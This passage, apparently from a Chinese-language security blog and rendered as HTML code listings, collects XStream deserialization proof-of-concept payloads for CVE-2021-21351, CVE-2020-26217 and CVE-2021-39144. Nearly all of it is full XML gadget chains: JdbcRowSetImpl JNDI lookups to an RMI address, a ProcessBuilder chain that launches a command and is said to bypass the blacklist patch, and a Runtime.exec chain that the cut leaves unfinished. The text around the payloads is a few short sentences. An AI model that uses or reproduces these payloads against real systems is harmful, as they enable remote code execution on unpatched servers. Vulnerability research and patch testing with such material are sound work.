class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="uQpkR">CVE-2021-21351</h3>
+Poc如下
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">m__dtm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__size</span>&gt;</span>-10086<span class="tag">&lt;/<span class="name">m__size</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">__overrideDefaultParser</span>&gt;</span>false<span class="tag">&lt;/<span class="name">__overrideDefaultParser</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">m__incremental</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__incremental</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">m__source__location</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__source__location</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">m__defaultHandler</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__shouldStripWS</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__shouldStripWS</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__indexing</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__indexing</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__incrementalSAXSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">fPullParserConfig</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">listeners</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">default</span>/&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">fPullParserConfig</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">name</span>&gt;</span>setAutoCommit<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">class</span>&gt;</span>boolean<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">fConfigParse</span> <span class="attr">reference</span>=<span class="string">&#x27;../fConfigSetInput&#x27;</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">fParseInProgress</span>&gt;</span>false<span class="tag">&lt;/<span class="name">fParseInProgress</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">m__incrementalSAXSource</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__walker</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nextIsRaw</span>&gt;</span>false<span class="tag">&lt;/<span class="name">nextIsRaw</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">m__walker</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__endDocumentOccured</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__endDocumentOccured</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__idAttributes</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__textPendingStart</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">m__textPendingStart</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__useSourceLocationProperty</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__useSourceLocationProperty</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__pastFirstElement</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__pastFirstElement</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">m__dtm</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">m__dtmIdentity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmIdentity</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__dtmRoot</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmRoot</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__allowRelease</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__allowRelease</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="aMlfF">CVE-2020-26217</h3>
+漏洞Poc如下，这里通过一个黑名单之外的gadget，可以成功绕过之前的补丁造成远程命令执行。包括1.4.13在内的所有版本都会受到漏洞的影响。
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="WZtEe"><font style="color:rgb(51, 51, 51);">CVE-2021-39144</font></h3>
+这条链是纯原生反序列化利用链
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&#x27;sun.tracing.NullProvider&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">active</span>&gt;</span>true<span class="tag">&lt;/<span class="name">active</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">providerType</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">providerType</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">probes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">name</span>&gt;</span>compareTo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">sun.tracing.dtrace.DTraceProbe</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">proxy</span> <span class="attr">class</span>=<span class="string">&#x27;java.lang.Runtime&#x27;</span>/&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">implementing__method</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.Runtime<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">name</span>&gt;</span>exec<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.String<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span 